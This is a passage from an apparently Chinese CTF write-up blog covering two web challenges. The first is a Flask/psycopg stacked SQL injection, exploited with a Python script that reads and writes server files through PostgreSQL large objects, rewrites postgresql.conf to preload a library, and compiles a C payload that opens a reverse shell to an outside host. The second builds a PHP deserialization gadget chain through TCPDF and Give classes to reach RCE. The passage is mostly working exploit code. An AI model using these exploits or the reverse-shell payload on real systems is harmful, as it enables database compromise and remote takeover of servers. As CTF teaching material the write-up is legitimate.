class="line">                        <span class="string">f&quot;UPDATE products SET stock = <span class="subst">&#123;new_stock&#125;</span> WHERE id = <span class="subst">&#123;product_id&#125;</span>;&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                conn.commit()</span><br><span class="line">                flash(<span class="string">f&quot;Successfully bought <span class="subst">&#123;qty&#125;</span> x <span class="subst">&#123;product[<span class="number">1</span>]&#125;</span>!&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;list_products&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;buy.html&quot;</span>, product=product)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p><code>psycopg</code> 是一个用于连接和操作 PostgreSQL 数据库的 Python 库。它是 Python 中最常用的 PostgreSQL 数据库驱动之一，提供了高效的接口来与 PostgreSQL 数据库进行交互</p>
+<p>过滤了单双引号，这个可以简单地通过 <code>CHR(xx)||CHR(xx)</code> 绕过</p>
+<p>而<code>/buy/&lt;product_id&gt;</code>这里，id 这个注入点是没有引号的，可以直接在后面跟着注</p>
+<p><strong>虽然本题没有提供源码，但应该能看出来是 Flask；搜一下 Python 这边最流行的库是 <a target="_blank" rel="noopener" href="https://www.psycopg.org/">psycopg</a>，你会发现他甚至是支持堆叠注入的。</strong></p>
+<p>那么第一步我们先注一个版本看一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://106.14.191.23:53273&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 /buy/ 端点进行 SQL 注入</span></span><br><span class="line"><span class="comment"># 利用 INSERT 语句执行 SQL 并回显结果</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_sql_echo</span>(<span class="params">sql</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[SQL ECHO] &quot;</span> + sql[:<span class="number">100</span>])</span><br><span class="line">    <span class="comment"># r = requests.post(</span></span><br><span class="line">    <span class="comment">#     BASE + &quot;/search&quot;,</span></span><br><span class="line">    <span class="comment">#     data=&#123;</span></span><br><span class="line">    <span class="comment">#         &quot;product_name&quot;: f&quot;&#x27;; INSERT INTO products (product_name, price, stock) VALUES ((&#123;sql&#125;), 0, 0); --&quot;</span></span><br><span class="line">    <span class="comment">#     &#125;,</span></span><br><span class="line">    <span class="comment"># )</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(</span><br><span class="line">            BASE</span><br><span class="line">            + <span class="string">&quot;/buy/&quot;</span></span><br><span class="line">            + <span class="string">f&quot;1; INSERT INTO products (product_name, price, stock, description) VALUES ((<span class="subst">&#123;sql&#125;</span>), 0, 0, CHR(32)); --&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 直接执行 SQL 语句（无回显）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_sql</span>(<span class="params">sql</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[SQL] &quot;</span> + sql[:<span class="number">100</span>])</span><br><span class="line">    <span class="comment"># r = requests.post(</span></span><br><span class="line">    <span class="comment">#     BASE + &quot;/search&quot;,</span></span><br><span class="line">    <span class="comment">#     data=&#123;&quot;product_name&quot;: f&quot;&#x27;; &#123;sql&#125;; --&quot;&#125;,</span></span><br><span class="line">    <span class="comment"># )</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(BASE + <span class="string">&quot;/buy/&quot;</span> + <span class="string">f&quot;1; <span class="subst">&#123;sql&#125;</span>; --&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串转换为 CHR() 函数序列</span></span><br><span class="line"><span class="comment"># 例如：&quot;AB&quot; -&gt; &quot;CHR(65)||CHR(66)&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_string</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;||&quot;</span>.join([<span class="string">f&quot;CHR(<span class="subst">&#123;<span class="built_in">ord</span>(i)&#125;</span>)&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> string])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取远程服务器文件</span></span><br><span class="line"><span class="comment"># 使用 PostgreSQL 大对象 (Large Object) 功能</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">remote_fn, lo_id</span>):</span><br><span class="line">    execute_sql_echo(</span><br><span class="line">        <span class="string">f&quot;CAST((SELECT lo_import(<span class="subst">&#123;encode_string(remote_fn)&#125;</span>, <span class="subst">&#123;lo_id&#125;</span>)) AS text)&quot;</span></span><br><span class="line">    )</span><br><span class="line">    execute_sql_echo(<span class="string">f&quot;SELECT lo_get(<span class="subst">&#123;lo_id&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将本地文件写入远程服务器</span></span><br><span class="line"><span class="comment"># 分块处理大文件，使用 base64 编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">local_fn, remote_fn, lo_id</span>):</span><br><span class="line">    chunk_size = <span class="number">2048</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(local_fn, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read(chunk_size)</span><br><span class="line">        part_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> content:</span><br><span class="line">            b64_chunk = base64.b64encode(content).decode()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> part_index == <span class="number">0</span>:</span><br><span class="line">                execute_sql_echo(</span><br><span class="line">                    <span class="string">f&quot;CAST((SELECT lo_from_bytea(<span class="subst">&#123;lo_id&#125;</span>, decode(<span class="subst">&#123;encode_string(b64_chunk)&#125;</span>, <span class="subst">&#123;encode_string(<span class="string">&#x27;base64&#x27;</span>)&#125;</span>))) AS text)&quot;</span></span><br><span class="line">                )</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                execute_sql_echo(</span><br><span class="line">                    <span class="string">f&quot;CAST((SELECT lo_put(<span class="subst">&#123;lo_id&#125;</span>, <span class="subst">&#123;chunk_size * part_index&#125;</span>, decode(<span class="subst">&#123;encode_string(b64_chunk)&#125;</span>, <span class="subst">&#123;encode_string(<span class="string">&#x27;base64&#x27;</span>)&#125;</span>))) AS text)&quot;</span></span><br><span class="line">                )</span><br><span class="line">            content = f.read(chunk_size)</span><br><span class="line">            part_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Optionally, export the LO data to remote file after writing all chunks</span></span><br><span class="line">    execute_sql_echo(</span><br><span class="line">        <span class="string">f&quot;CAST((SELECT lo_export(<span class="subst">&#123;lo_id&#125;</span>, <span class="subst">&#123;encode_string(remote_fn)&#125;</span>)) AS text)&quot;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">execute_sql_echo(<span class="string">&quot;SELECT version()&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>PostgreSQL 大对象操作</strong></p>
+<ul>
+<li><code>lo_import()</code>: 将文件导入为大对象</li>
+<li><code>lo_get()</code>: 获取大对象内容</li>
+<li><code>lo_from_bytea()</code>: 从字节数组创建大对象</li>
+<li><code>lo_put()</code>: 向大对象写入数据</li>
+<li><code>lo_export()</code>: 将大对象导出为文件</li>
+</ul>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products (product_name, price, stock, description) </span><br><span class="line"><span class="keyword">VALUES</span> ((<span class="keyword">SELECT</span> version()), <span class="number">0</span>, <span class="number">0</span>, CHR(<span class="number">32</span>));</span><br></pre></td></tr></table></figure>
+<p>执行结果会作为 product_name 插入到表中</p>
+<p>执行后在/list：</p>
+<p><img src="../images/image-20251014125905428.png" alt="image-20251014125905428" /></p>
+<p>感觉我看到这里已经是极限了，<strong>后面纯纯看不懂</strong></p>
+<p>直接复制粘贴官方题解：</p>
+<p>注完你可能才会发现这后面是一个 pg，在 products 表里也只会找到一个假 flag 😈；提示我们这题需要 RCE。</p>
+<p>题解这里用的一种可能的方法是 <a target="_blank" rel="noopener" href="https://adeadfed.com/posts/postgresql-select-only-rce/">preload library RCE</a>，参考利用脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">lo_id = <span class="number">114024</span></span><br><span class="line"></span><br><span class="line">execute_sql_echo(<span class="string">&quot;SELECT version()&quot;</span>)</span><br><span class="line"></span><br><span class="line">execute_sql_echo(<span class="string">&quot;SELECT sourcefile FROM pg_file_settings LIMIT 1&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_file(<span class="string">&quot;/etc/postgresql/17/main/postgresql.conf&quot;</span>, lo_id)</span><br><span class="line"></span><br><span class="line">write_file(<span class="string">&quot;./postgresql.conf&quot;</span>, <span class="string">&quot;/etc/postgresql/17/main/postgresql.conf&quot;</span>, lo_id + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_file(<span class="string">&quot;./payload.so&quot;</span>, <span class="string">&quot;/tmp/payload.so&quot;</span>, lo_id + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">execute_sql_echo(<span class="string">&quot;CAST((SELECT pg_reload_conf()) AS text)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">execute_sql(</span></span><br><span class="line"><span class="string">    f&quot;CREATE OR REPLACE FUNCTION _init(void) RETURNS void AS &#123;encode_string(&#x27;/tmp/payload.so&#x27;)&#125;, &#123;encode_string(&#x27;_init&#x27;)&#125; LANGUAGE C STRICT&quot;</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># you probably should wait longer irl</span></span><br><span class="line">sleep(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">execute_sql_echo(<span class="string">&quot;SELECT version()&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>由于需要改配置文件，可能需要你拿到一份服务器上的配置再做修改。在最后加上两行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dynamic_library_path = &#x27;/tmp:$libdir&#x27;</span><br><span class="line">session_preload_libraries = &#x27;payload.so&#x27;</span><br></pre></td></tr></table></figure>
+<p>保存为自己的配置运行脚本上传即可。</p>
+<p>其中 <a target="_blank" rel="noopener" href="http://payload.so">payload.so</a> 构造如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;postgres.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fmgr.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">  <span class="type">int</span> port = <span class="number">8888</span>;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> revsockaddr;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> sockt = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">  revsockaddr.sin_family = AF_INET;</span><br><span class="line">  revsockaddr.sin_port = <span class="built_in">htons</span>(port);</span><br><span class="line">  revsockaddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">connect</span>(sockt, (<span class="keyword">struct</span> sockaddr *)&amp;revsockaddr, <span class="built_in">sizeof</span>(revsockaddr));</span><br><span class="line">  <span class="built_in">dup2</span>(sockt, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">dup2</span>(sockt, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">dup2</span>(sockt, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *<span class="type">const</span> argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="built_in">execve</span>(<span class="string">&quot;/bin/bash&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o paylo</span></span><br></pre></td></tr></table></figure>
+<p>编译比较麻烦一点，可能需要找个同版本的 pg dev lib；容器里我直接用的 debian 官方源，安装一下 postgresql-server-dev-all 就可以了。</p>
+<p>由于题目用的是 psycopg 连接池，等一会发起新的连接就能得到反弹 shell 了。</p>
+<p>当然这题也有很多其他解法，比如改 ssl_passphrase_command 等等；当然由于我忘了改 user 权限导致可以直接 <code>COPY files FROM PROGRAM 'xxx';</code> 得到 rce，属于是变简单了一些。</p>
+<h3 id="make-php-greater-againphp内置接口反序列化"><a class="markdownIt-Anchor" href="#make-php-greater-againphp内置接口反序列化"></a> make php greater again(PHP内置接口反序列化)</h3>
+<p><img src="../images/image-20251014131140215.png" alt="image-20251014131140215" /></p>
+<h4 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点</h4>
+<p><img src="../images/image-20251014131313160.png" alt="image-20251014131313160" /></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.interfaces.php">PHP: 预定义接口和类 - Manual</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.iteratoraggregate.php">PHP: IteratorAggregate - Manual</a></p>
+<h4 id="找链子"><a class="markdownIt-Anchor" href="#找链子"></a> 找链子</h4>
+<p>全局搜索<code>__destruct</code> 可以发现存在两个类，其中 TCPDF 的<code>__destruct</code> 可以调用<code>_destroy</code> 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TCPDF</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// cleanup</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_destroy</span>(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_destroy</span>(<span class="params"><span class="variable">$destroyall</span>=<span class="literal">false</span>, <span class="variable">$preserve_objcopy</span>=<span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">...</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;imagekeys)) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;imagekeys <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">             <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$file</span>) &amp;&amp;<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, _K_PATH_CACHE_) === <span class="number">0</span> &amp;&amp; TCPDF_STATIC::<span class="title function_ invoke__">_file_exists_</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                       @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现其使用了 foreach 对 <code>$this-&gt;imagekeys</code> 进行了遍历,而 <code>$this-&gt;imagekeys</code> 是可以通过反序列操控的变量，只要将其指定为实现了<code>IteratorAggregate</code> 接口的类，对其进行foreach遍历时就能触发 <strong>getIterator</strong></p>
+<p>（题外话:题目里对_destroy 方法进行了简单的修改,在 11 行增加了一个 <code>is_string($file)</code> 的判断，以此避免了通过设置 <code>$this-&gt;imagekeys</code> 为一个对象数组，后续通过 strpos 或者 unlink 函数触发 <code>$file</code> 的__toString 方法来串联后续的链条，强制选手必须通过 getIterator 链来完成 RCE）</p>
+<p><strong>全局搜索 getIterator 方法</strong>,发现有挺多类实现了这个方法,笔者这里选用了 <strong>Give</strong>这个类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">\ArrayIterator</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttributeBag</span>()-&gt;<span class="title function_ invoke__">all</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttributeBag</span>(<span class="params"></span>): <span class="title">AttributeBagInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getBag</span>(<span class="variable">$this</span>-&gt;attributeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBag</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$bag</span> = <span class="variable language_">$this</span>-&gt;storage-&gt;<span class="title function_ invoke__">getBag</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">method_exists</span>(<span class="variable">$bag</span>, <span class="string">&#x27;getBag&#x27;</span>) ? <span class="variable">$bag</span>-&gt;<span class="title function_ invoke__">getBag</span>() : <span class="variable">$bag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过 getIterator 调用<code>$this-&gt;getAttributeBag()</code>调用<code>$this-&gt;getBag</code>(参数可控)再调用<code>$this-&gt;storage-&gt;getBag($name)</code>,此处可通过 <code>$this-&gt;storage</code> 触发<code>__call</code> 方法,全局搜索<code>__call</code>,有一个 <strong>ProviderForwarder 类</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Give</span>\<span class="title class_">TestData</span>\<span class="title class_">Framework</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">ProviderForwarder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> array */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$loadedProviders</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Forward calls to a provider class._</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $name_</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array  $arguments_</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed_</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$provider</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;loadedProviders[<span class="variable">$name</span>]) ? <span class="variable language_">$this</span>-&gt;loadedProviders[<span class="variable">$name</span>] : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadProvider</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;loadedProviders[<span class="variable">$name</span>], <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Load a provider by class name, adjusted for case._</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $name_</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Contract\Provider_</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">loadProvider</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$providerClass</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%s\%s\%s&#x27;</span>, ___NAMESPACE___, <span class="string">&#x27;Provider&#x27;</span>, <span class="title function_ invoke__">ucfirst</span>(<span class="variable">$name</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;loadedProviders[<span class="variable">$name</span>] = <span class="title function_ invoke__">give</span>()-&gt;<span class="title function_ invoke__">make</span>(<span class="variable">$providerClass</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个__call 最终调用了 <code>call_user_func_array($this-&gt;loadedProviders[$name], $arguments);</code>这个<code>$this-&gt;loadedProviders[$name]</code>可控,<code>$arguments</code> 可控（Session 的 <code>$this-&gt;attributeName</code>）,可以最终实现 RCE</p>
+<p>最终 payload 如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 